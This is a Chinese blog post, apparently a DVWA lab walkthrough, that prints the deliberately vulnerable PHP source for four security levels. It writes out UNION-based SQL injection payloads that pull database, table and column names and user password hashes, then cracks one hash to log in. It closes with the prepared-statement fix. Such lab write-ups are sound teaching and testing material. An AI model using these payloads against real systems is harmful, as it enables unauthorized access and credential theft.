<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Security ❀ SQL Injection SQL注入 - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Security ❀ SQL Injection SQL注入" />
<meta property="og:description" content="文章目录 1、low2、medium3、high4、impossible 1、low 源码解析：
&lt;?php if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) { // Get input $id = $_REQUEST[ &#39;id&#39; ]; // Check database $query = &#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;&#34;; $result = mysqli_query($GLOBALS[&#34;___mysqli_ston&#34;], $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&#34;___mysqli_ston&#34;])) ? mysqli_error($GLOBALS[&#34;___mysqli_ston&#34;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); // Get results while( $row = mysqli_fetch_assoc( $result ) ) { // Get values $first = $row[&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/ab120b646816ac557c57985669657dd9/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-11-10T17:17:29+08:00" />
<meta property="article:modified_time" content="2021-11-10T17:17:29+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Security ❀ SQL Injection SQL注入</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-tomorrow-night">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>文章目录</h4> 
 <ul><li><a href="#1low_2" rel="nofollow">1、low</a></li><li><a href="#2medium_77" rel="nofollow">2、medium</a></li><li><a href="#3high_130" rel="nofollow">3、high</a></li><li><a href="#4impossible_171" rel="nofollow">4、impossible</a></li></ul> 
</div> 
<p></p> 
<h2><a id="1low_2"></a>1、low</h2> 
<hr> 
<p>源码解析：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Check database</span>
    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>';"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get results</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Get values</span>
        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>源码中并无任何防护，直接进行SQL注入即可；<br> <img src="https://images2.imgbox.com/2e/f1/WkaCFScG_o.png" alt="在这里插入图片描述"></p> 
<p>注入框内命令说明：源码内附带SQL查询语句，输入框内数据代表源码中的 ‘$id’ 变量，使用union可以进行联合查询（union不会列出相同数据），#会注释该符号后面的所有内容，解析如下：</p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#';</span>
</code></pre> 
<p>获取数据库名称；</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#</span>
</code></pre> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/de/d6/y2676juc_o.png" alt="在这里插入图片描述"></p> 
<p>获取表名称；</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">COLLATE</span> utf8_general_ci <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#</span>
</code></pre> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/99/6f/EU0YO88a_o.png" alt="在这里插入图片描述"></p> 
<p>获取列名称；</p> 
<pre><code class="prism language-sql"><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name) COLLATE utf8_general_ci from information_schema.columns where table_name='</span>users' <span class="token comment">#</span>
</code></pre> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/1a/0f/MWii0zkg_o.png" alt="在这里插入图片描述"></p> 
<p>查询所有账户与密码信息；</p> 
<pre><code class="prism language-sql"><span class="token number">1</span>' <span class="token operator">or</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>user_id<span class="token punctuation">,</span>first_name<span class="token punctuation">,</span>last_name<span class="token punctuation">)</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">#</span>
</code></pre> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/5e/33/k00byHdo_o.png" alt="在这里插入图片描述"></p> 
<p>获取到密码后，将密码字段单独复制在解密网页内进行解密；<br> <img src="https://images2.imgbox.com/20/b0/aMhoAZvB_o.png" alt="在这里插入图片描述"></p> 
<p>解密成功；<br> <img src="https://images2.imgbox.com/ca/5a/2pzyY311_o.png" alt="在这里插入图片描述"></p> 
<p>结果验证：使用 gordonb/abc123登录DVWA，登录成功；<br> <img src="https://images2.imgbox.com/d7/5b/D5hbrySv_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="2medium_77"></a>2、medium</h2> 
<hr> 
<p>源码解析：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = <span class="token interpolation"><span class="token variable">$id</span></span>;"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get results</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Display values</span>
        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token comment">// This is used later on in the index.php page</span>
<span class="token comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>
<span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT COUNT(*) FROM users;"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;'</span> <span class="token operator">.</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$___mysqli_res</span> <span class="token punctuation">:</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$number_of_rows</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_row</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>源码限制了选择内容，可以通过Burpsuite修改http请求输入变量内容；</p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/53/4d/vE13cUpy_o.png" alt="在这里插入图片描述"></p> 
<p>抓包修改；<br> <img src="https://images2.imgbox.com/cf/a8/RaNd7LmH_o.png" alt="在这里插入图片描述"></p> 
<p>修改完成；<br> <img src="https://images2.imgbox.com/c6/72/4GQGP6rl_o.png" alt="在这里插入图片描述"></p> 
<p>结果验证：<br> <img src="https://images2.imgbox.com/db/b1/VV7sAC93_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="3high_130"></a>3、high</h2> 
<hr> 
<p>源码解析：</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_SESSION</span> <span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Check database</span>
    <span class="token variable">$query</span>  <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT first_name, last_name FROM users WHERE user_id = '<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 1;"</span><span class="token punctuation">;</span>
    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$query</span> <span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'&lt;pre&gt;Something went wrong.&lt;/pre&gt;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get results</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span> <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span> <span class="token variable">$result</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Get values</span>
        <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"first_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"last_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

        <span class="token comment">// Feedback for end user</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$___mysqli_res</span> <span class="token operator">=</span> <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"___mysqli_ston"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token argument-name">false</span> <span class="token punctuation">:</span> <span class="token variable">$___mysqli_res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        
<span class="token punctuation">}</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre> 
<p>源码中LIMIT可以限制输出的结果数量，可以使用#进行注释，#后面的命令均不在生效；</p> 
<pre><code class="prism language-sql"><span class="token keyword">SELECT</span> first_name<span class="token punctuation">,</span> last_name <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> user_id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#' LIMIT 1;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/fe/d7/cnyrT9op_o.png" alt="在这里插入图片描述"></p> 
<p>结果验证；<br> <img src="https://images2.imgbox.com/0c/c4/FYdqvVoi_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="4impossible_171"></a>4、impossible</h2> 
<hr> 
<p>源码解析：校验变量只能为单个数字即可；</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token keyword">isset</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'Submit'</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token comment">// Check Anti-CSRF token</span>
    <span class="token function">checkToken</span><span class="token punctuation">(</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'user_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'session_token'</span> <span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'index.php'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Get input</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'id'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// Was a number entered?</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span> <span class="token variable">$id</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token comment">// Check the database</span>
        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">':id'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token class-name static-context">PDO</span><span class="token operator">::</span><span class="token constant">PARAM_INT</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Make sure only 1 result is returned</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token variable">$data</span><span class="token operator">-&gt;</span><span class="token function">rowCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token comment">// Get values</span>
            <span class="token variable">$first</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'first_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$last</span>  <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'last_name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

            <span class="token comment">// Feedback for end user</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre&gt;ID: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$id</span><span class="token punctuation">}</span></span>&lt;br /&gt;First name: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$first</span><span class="token punctuation">}</span></span>&lt;br /&gt;Surname: <span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$last</span><span class="token punctuation">}</span></span>&lt;/pre&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token comment">// Generate Anti-CSRF token</span>
<span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token operator">?</span><span class="token operator">&gt;</span>
</code></pre>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/7cbc636de24b010460d7a2cf4ee2234b/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">STM32F4步进电机速度和位移与定时器输出PWM频率计算</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/7de258b8e3acc36c27a691ccafbe1431/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Security ❀ SQL Injection (Blind) SQL盲注</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>